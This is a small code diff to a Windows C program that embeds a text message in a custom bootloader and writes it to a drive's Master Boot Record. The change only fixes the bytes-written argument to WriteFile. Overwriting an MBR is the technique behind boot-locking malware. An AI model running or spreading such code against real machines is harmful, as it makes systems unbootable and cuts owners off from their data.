@@ -104,7 +104,9 @@ int main() {
     memcpy(bootloader + TEXT_OFFSET, text, TEXT_SIZE);
 
     // write the bootloader to the MBR
-    if (!WriteFile(drive, bootloader, 512, NULL, NULL)) {
+    DWORD written;
+
+    if (!WriteFile(drive, bootloader, 512, &written, NULL)) {
         fprintf(stderr, "Error: couldn't write to the drive.\n");
         fprintf(stderr, "Code: %d\n", (int)GetLastError());
 
